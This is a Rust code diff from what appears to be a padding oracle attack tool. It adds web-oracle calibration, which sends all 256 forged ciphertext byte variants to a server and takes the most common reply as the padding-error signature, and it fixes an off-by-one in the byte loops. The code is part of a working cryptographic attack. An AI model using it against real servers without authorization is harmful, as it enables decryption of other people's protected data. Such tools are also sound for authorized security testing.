@@ -1,13 +1,15 @@
-use std::mem;
+pub mod calibration_response;
+
+use std::{collections::HashMap, mem};
 
 use anyhow::{Context, Result};
 use rayon::iter::{IntoParallelIterator, ParallelIterator};
-use reqwest::blocking::Response;
 
 use crate::{
     block::block_size::BlockSizeTrait,
     cypher_text::{encode::AmountBlocksTrait, forged_cypher_text::ForgedCypherText, CypherText},
     oracle::{web::calibrate_web::CalibrationWebOracle, Oracle},
+    questioning::calibration_response::CalibrationResponse,
 };
 
 /// Manages the oracle attack on a high level.
@@ -47,7 +49,7 @@ impl<'a> Questioning<'a> {
                 let mut bytes_answered = 0;
                 while bytes_answered < *forged_cypher_text.block_size() {
                     // TODO: using `parallel-stream` instead of `rayon` would likely be better. The oracle does the hard work, i.e. decryption, and is usually remote. So we're I/O bound, which prefers async, instead of CPU bound.
-                    let current_byte_solution = (u8::MIN..u8::MAX)
+                    let current_byte_solution = (u8::MIN..=u8::MAX)
                         .into_par_iter()
                         .map(|byte_value| {
                             let mut forged_cypher_text = forged_cypher_text.clone();
@@ -76,7 +78,7 @@ impl<'a> Questioning<'a> {
                                 &mut current_solution.context(format!("Failed to decrypt block {}", current_block_idx))?
                             );
                         }
-                        None => unreachable!("A solution for the current byte should exist at this point. We namely unpacked the `.collect::<Result<_>>()`")
+                        None => unreachable!("A solution for the current byte should exist at this point. We tried all possible byte values")
                     }
                 }
 
@@ -85,24 +87,42 @@ impl<'a> Questioning<'a> {
             .collect::<Result<_>>()
     }
 
-    pub fn calibrate_web_oracle(&mut self, oracle: CalibrationWebOracle) -> Result<Self> {
+    /// Find how the web oracle responds in case of a padding error
+    pub fn calibrate_web_oracle(
+        &mut self,
+        oracle: CalibrationWebOracle,
+    ) -> Result<CalibrationResponse> {
         // `clone` to make sure we don't modify any forged cypher texts before the actual attack
         let calibration_cypher_text = &self.forged_cypher_texts[0];
 
-        let responses = (u8::MIN..u8::MAX)
+        let responses = (u8::MIN..=u8::MAX)
             .into_par_iter()
             .map(|byte_value| {
                 let mut forged_cypher_text = calibration_cypher_text.clone();
 
                 forged_cypher_text.set_current_byte(byte_value)?;
-                oracle.ask_validation(&forged_cypher_text)
+                let response = oracle.ask_validation(&forged_cypher_text)?;
+                CalibrationResponse::from_response(response, oracle.options().consider_body())
             })
             .collect::<Result<Vec<_>>>()
             .context("Failed to request web server for calibration")?;
 
-        eprintln!("responses = {:#?}", responses);
-        // TODO: save this
-        // correct_padding_response: Option<Response>,
-        todo!()
+        // false positive, the hashmap's key (`response`) is obviously not mutable
+        #[allow(clippy::mutable_key_type)]
+        let counted_responses = responses.into_iter().fold(
+            HashMap::new(),
+            |mut acc: HashMap<CalibrationResponse, usize>, response| {
+                *acc.entry(response).or_default() += 1;
+                acc
+            },
+        );
+
+        let padding_error_response = counted_responses
+            .into_iter()
+            .max_by_key(|(_, seen)| *seen)
+            .map(|(response, _)| response)
+            .expect("The hashmap didn't contain any responses for calibration");
+
+        Ok(padding_error_response)
     }
 }
